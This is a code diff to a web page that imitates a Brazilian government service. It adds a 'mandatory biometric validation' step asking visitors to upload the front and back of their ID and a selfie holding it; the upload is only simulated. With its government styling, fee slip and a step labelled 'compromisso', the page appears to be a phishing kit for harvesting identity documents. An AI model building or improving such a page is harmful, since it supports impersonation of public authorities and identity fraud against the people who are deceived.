@@ -103,11 +103,28 @@
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
         /* UPLOAD BOX */
-        .upload-container { 
-            border: 2px dashed var(--gov-blue-p); background: #f2f7fd; border-radius: 8px; 
-            padding: 40px; text-align: center; cursor: pointer; transition: 0.2s;
+        .upload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
         }
-        .upload-container:hover { background: #e6f0fa; }
+
+        .upload-card {
+            border: 2px dashed var(--gov-blue-p);
+            background: #f2f7fd;
+            border-radius: 8px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+            position: relative;
+        }
+
+        .upload-card:hover { background: #e6f0fa; }
+
+        .upload-card strong { display: block; margin-top: 10px; color: #333; }
+        .upload-card span { display: block; color: #666; margin-top: 6px; font-size: 13px; }
+        .upload-card input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
         
         /* GRU CUSTOMIZADA */
         .gru-paper {
@@ -257,12 +274,35 @@
         <!-- ETAPA 3: UPLOAD (COMPROMISSO) -->
         <div id="step-3" class="gov-card hidden">
             <h1 class="card-title">Validação Biométrica Obrigatória</h1>
-            <p class="card-subtitle">Para concluir a abertura do processo, anexe uma foto legível do seu documento de identificação (RG ou Carteira de Trabalho).</p>
+            <p class="card-subtitle">Para concluir a abertura do processo, anexe fotos legíveis do seu documento de identificação (RG ou Carteira de Trabalho).</p>
 
-            <div class="upload-container" onclick="simularUpload()">
-                <i class="fas fa-id-card" style="font-size: 48px; color: var(--gov-blue-p); margin-bottom: 20px;"></i>
-                <h3 style="margin: 0; color: #333;">Clique para anexar documento (Frente e Verso)</h3>
-                <p style="font-size: 13px; color: #666; margin-top: 10px;">O sistema fará o reconhecimento automático (OCR).</p>
+            <div class="upload-grid">
+                <label class="upload-card">
+                    <i class="fas fa-id-card" style="font-size: 36px; color: var(--gov-blue-p);"></i>
+                    <strong>Frente do documento</strong>
+                    <span id="file-front-label">Nenhum arquivo selecionado</span>
+                    <input type="file" id="file-front" accept="image/*,.pdf" onchange="atualizarNomeArquivo(this, 'file-front-label')">
+                </label>
+
+                <label class="upload-card">
+                    <i class="fas fa-id-card" style="font-size: 36px; color: var(--gov-blue-p);"></i>
+                    <strong>Verso do documento</strong>
+                    <span id="file-back-label">Nenhum arquivo selecionado</span>
+                    <input type="file" id="file-back" accept="image/*,.pdf" onchange="atualizarNomeArquivo(this, 'file-back-label')">
+                </label>
+
+                <label class="upload-card">
+                    <i class="fas fa-user-check" style="font-size: 36px; color: var(--gov-blue-p);"></i>
+                    <strong>Foto segurando o documento</strong>
+                    <span id="file-selfie-label">Nenhum arquivo selecionado</span>
+                    <input type="file" id="file-selfie" accept="image/*" onchange="atualizarNomeArquivo(this, 'file-selfie-label')">
+                </label>
+            </div>
+
+            <div class="btn-center" style="margin-top: 20px;">
+                <button class="btn-gov" onclick="enviarArquivos()">
+                    Enviar arquivos <i class="fas fa-cloud-upload-alt"></i>
+                </button>
             </div>
 
             <div id="upload-progress" class="hidden" style="margin-top: 20px;">
@@ -515,11 +555,36 @@
             alert("Protocolo copiado para a área de transferência.");
         }
 
+        function atualizarNomeArquivo(input, labelId) {
+            const label = document.getElementById(labelId);
+            if (input.files && input.files.length) {
+                label.innerText = input.files[0].name;
+            } else {
+                label.innerText = "Nenhum arquivo selecionado";
+            }
+        }
+
+        function enviarArquivos() {
+            const frente = document.getElementById('file-front');
+            const verso = document.getElementById('file-back');
+            const selfie = document.getElementById('file-selfie');
+
+            if (!frente.files.length || !verso.files.length || !selfie.files.length) {
+                alert("Selecione os três arquivos solicitados antes de enviar.");
+                return;
+            }
+
+            simularUpload();
+        }
+
         function simularUpload() {
             document.getElementById('upload-progress').classList.remove('hidden');
             let width = 0;
             let bar = document.getElementById('p-bar');
             let txt = document.getElementById('p-text');
+
+            bar.style.width = "0%";
+            txt.innerText = "Enviando...";
 
             let inv = setInterval(() => {
                 width++;
